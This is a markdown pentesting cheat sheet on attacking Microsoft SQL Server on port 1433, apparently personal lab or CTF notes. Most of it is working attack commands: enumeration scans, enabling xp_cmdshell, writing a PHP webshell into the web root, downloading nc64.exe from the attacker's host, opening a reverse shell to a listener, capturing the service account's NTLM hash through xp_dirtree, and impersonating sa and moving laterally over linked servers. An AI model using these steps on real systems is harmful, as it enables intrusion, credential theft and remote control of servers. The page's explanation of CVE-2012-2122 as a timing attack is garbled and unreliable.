---
title: 1433 msSQL
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - mssql
  - port 1433
  - impacket
---

# 1433 msSQL

[See msSQL](mssql.md).

??? abstract "Sources and resources"
	- [nc64.exe](https://github.com/vinsworldcom/NetCat64/releases).
	- [Impacket](impacket.md): mssqlclient.py.  
	- [Pentesmonkey Cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet).
	- [book.hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server).
	- [winPEAS](winpeas.md).

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. 

## Enumeration

Basic enumeration:

```bash
nmap -Pn -sV -sC -p1433 $ip
```


If you don't know anything about the service:

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip

sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip

```

We can also use Metasploit to run an auxiliary scanner called `mssql_ping` that will scan the MSSQL service and provide helpful information in our footprinting process.

#### MSSQL Ping in Metasploit

```shell-session
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

rhosts => 10.129.201.248


msf6 auxiliary(scanner/mssql/mssql_ping) > run

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```


## Connect to database:

### From Linux

#### sqsh

```shell-session
# Targeting a local account:
sqsh -S $ip -U <username> -P 'MyPassword!' -h

# Targeting Windows authentication
sqsh -S $ip -U .\\username -P 'MyPassword!' -h
# -h: disable headers and footers for a cleaner look.
```

#### mssqlclient.py from impacket 

Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.

```shell-session
mssqlclient.py -p $port username@$ip 
```

If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```bash
python3 mssqlclient.py Administrator@$ip -windows-auth  
# With python3 mssqlclient.py help you can see more options.
```


### From Windows

#### sqlcmd

```cmd-session
sqlcmd -S <server> -U <username> -P 'MyPassword!' -y 30 -Y 30
# When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```


### From GUI Application

#### Server Management Studio or SSMS

Download from: [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)

#### dbeaver 

[dbeaver](https://github.com/dbeaver/dbeaver) is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.

To install [dbeaver](https://github.com/dbeaver/dbeaver) using a Debian package we can download the release .deb package from [https://github.com/dbeaver/dbeaver/releases](https://github.com/dbeaver/dbeaver/releases) and execute the following command:

```
sudo dpkg -i dbeaver-<version>.deb

# run dbeaver in a second plane
 dbeaver &
```


## Basic mssql commands 

```
# Get Microsoft SQL server version
select @@version;

# Get usernames
select user_name()
go 

# We need to use GO after our query to execute the SQL syntax. 
# List databases
SELECT name FROM master.dbo.sysdatabases
go

# Select a database
USE $dbName
go
## Examples: Select a database master
## USE master

# Check out which one is the current selected database
SELECT DB_NAME()
go

# Show tables
SELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES
go

# Select a database and show content of a specific table.  
USE $dbName
SELECT * FROM $tableName 

# Example: Select all Data from Table "users". The name of the table ("users") was obtained when running the command for showing the tables.
SELECT * FROM users
go

# Get a list of users in the domain
SELECT name FROM master..syslogins
go

# Get a list of users that are sysadmins
SELECT name FROM master..syslogins WHERE sysadmin = 1
go

# And to make sure: 
SELECT is_srvrolemember('sysadmin')
go
# If your user is admin, it will return 1.
```

Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section `Executing cmd shell in a SQL command line`).

### Write files using MSSQL
To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

```cmd-session
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### Create files using MSSQL

```
# Using MSSQL to Create a File
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;
```

### Read files using MSSQL

```
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```


## Attacks

### Executing cmd shell in a SQL command line

Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command **xp_cmdshell**, that will allow us to use the SQL command line as a CLI. 

Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default.  `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)

**sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:

```msSQL
# To allow advanced options to be changed.   
EXECUTE sp_configure 'show advanced options', 1
go
  
# To update the currently configured value for advanced options.  
RECONFIGURE
go

# To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
go

# To update the currently configured value for this feature.  
RECONFIGURE
go
```

>Note:  The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account

Now we can use the MSSQL terminal to execute commands:

```msSQL
# Who am i?
xp_cmdshell 'whoami'
go

# This will return the .exe files existing in the current directory
EXEC xp_cmdshell 'dir *.exe'
go

# To print a file
EXECUTE xp_cmdshell 'type c:\Users\sql_svc\Desktop\user.txt
go

# With this (and a "python3 -m http.server 80" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
go

# We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a "nc -lnvp 443". When launching the reverse shell, we'll get a powershell terminal in this tab by running:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443";
# You could also upload winPEAS and run it from this powershell command line
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).


### Capture MSSQL Service Hash

We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.

When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

**1.** First, start [Responder](responder.md) or [smbserver from impacket](smbserver.md).

**2.** Run:

```cmd-session
# For XP_DIRTREE Hash Stealing
EXEC master..xp_dirtree '\\$KaliIP\share\'

# For XP_SUBDIRS Hash Stealing
EXEC master..xp_subdirs '\\$KaliIP\share\
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

**3.** XP_SUBDIRS Hash Stealing with Responder

```shell-session
sudo responder -I tun0
```

**4.** XP_SUBDIRS Hash Stealing with impacket

```shell-session
sudo impacket-smbserver share ./ -smb2support
```

### Impersonate Existing Users with MSSQL

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends:

Impersonating sysadmin:

```cmd-session
# Identify Users that we Can Impersonate
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
go

# Verify if our current user has the sysadmin role:
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
#  value 0 indicates no sysadmin role, value 1 is sysadmin role

```

Impersonating sa user:

```cmd-session
USE master
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go
```

> It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database.

To revert the operation and return to our previous user

```cmd-session
REVERT
go
```


### Communicate with Other Databases with MSSQL

`MSSQL` has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

```MSSQL
# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers
go
```

```output
srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0


# isremote, where 1 means is a remote server, and 0 is a linked server. 
```

```cmd-session
#  Identify the user used for the connection and its privileges:
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
go 

# The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
```

As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.


>  If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

### CVE-2012-2122 for MySQL 5.6.x

In the past, there was a vulnerability [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) in `MySQL 5.6.x` servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the `timing attack` vulnerability existed in the way MySQL handled authentication attempts.

In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure. In the case of `MySQL 5.6.x`, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.
